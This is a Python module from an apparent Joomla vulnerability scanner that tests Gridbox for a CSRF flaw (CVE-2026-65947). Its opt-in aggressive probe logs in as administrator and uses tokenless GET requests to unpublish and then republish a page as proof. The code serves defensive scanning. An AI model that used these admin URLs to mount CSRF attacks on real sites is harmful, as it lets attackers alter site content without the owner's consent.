from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65947"
NAME = "Gridbox administrator CSRF (missing session token)"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
PUBLIC_PAGE = "/index.php?option=com_gridbox&view=page&id="
UNPUBLISH = "/administrator/index.php?option=com_gridbox&task=pages.unpublish&cid[]="
PUBLISH = "/administrator/index.php?option=com_gridbox&task=pages.publish&cid[]="


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    admin_user: str | None = None,
    admin_password: str | None = None,
    page_id: str = "900001",
) -> Finding:
    base = normalize_url(target_url)
    if not admin_user or not admin_password:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{UNPUBLISH}{page_id}",
            detail="The probe needs the victim administrator session via --aggressive-arg admin_user=... admin_password=...; nothing was sent.",
            action="Re-run with lab administrator credentials on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    if not gb.admin_login(client, base, admin_user, admin_password, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{UNPUBLISH}{page_id}",
            detail="The administrator login form was not available.",
            action="Verify the backend login route and credentials.",
        )
    if not gb.admin_dashboard(client, base, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{UNPUBLISH}{page_id}",
            detail="The supplied account could not reach the control panel.",
            action="Verify the account is an administrator.",
        )
    before = HttpClient(timeout=timeout, proxy=proxy).get(f"{base}{PUBLIC_PAGE}{page_id}", timeout=timeout)
    unpublish = client.get(f"{base}{UNPUBLISH}{page_id}", timeout=timeout)
    after_unpublish = HttpClient(timeout=timeout, proxy=proxy).get(f"{base}{PUBLIC_PAGE}{page_id}", timeout=timeout)
    publish = client.get(f"{base}{PUBLISH}{page_id}", timeout=timeout)
    after_publish = HttpClient(timeout=timeout, proxy=proxy).get(f"{base}{PUBLIC_PAGE}{page_id}", timeout=timeout)
    evidence: dict[str, object] = {
        "page_id": page_id,
        "before_status": before.get("status"),
        "unpublish_status": unpublish.get("status"),
        "unpublish_accepted": "successfully unpublished" in (unpublish.get("body", "") or "").lower(),
        "after_unpublish_status": after_unpublish.get("status"),
        "publish_status": publish.get("status"),
        "publish_accepted": "successfully published" in (publish.get("body", "") or "").lower(),
        "after_publish_status": after_publish.get("status"),
    }
    changed = (
        after_unpublish.get("status") == 404
        and before.get("status") != 404
        and after_publish.get("status") == before.get("status")
    )
    if evidence["unpublish_accepted"] and changed:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{UNPUBLISH}{page_id}",
            evidence=evidence,
            detail=(
                "A tokenless top-level GET to the administrator pages.unpublish task changed the "
                f"published page to HTTP 404 (was {before.get('status')}); a tokenless pages.publish "
                "restored it. No session token or POST body was required, so a logged-in "
                "administrator visiting an attacker page can be made to perform the change."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later (HasSessionTokenCheck), and require POST + token "
                "for administrator mutations."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{UNPUBLISH}{page_id}",
        evidence=evidence,
        detail=(
            "The tokenless administrator request did not change the page state "
            f"(unpublish_accepted={evidence['unpublish_accepted']}, before={before.get('status')}, "
            f"after_unpublish={after_unpublish.get('status')})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; administrator mutations lack a session token.",
        patched_detail="Gridbox requires a session token for administrator mutations.",
        action="Upgrade Gridbox to 2.20.2 or later and avoid GET-driven administrator actions.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only tokenless state-change proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        admin_user=args.get("admin_user"),
        admin_password=args.get("admin_password"),
        page_id=str(args.get("page_id") or "900001"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65947",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
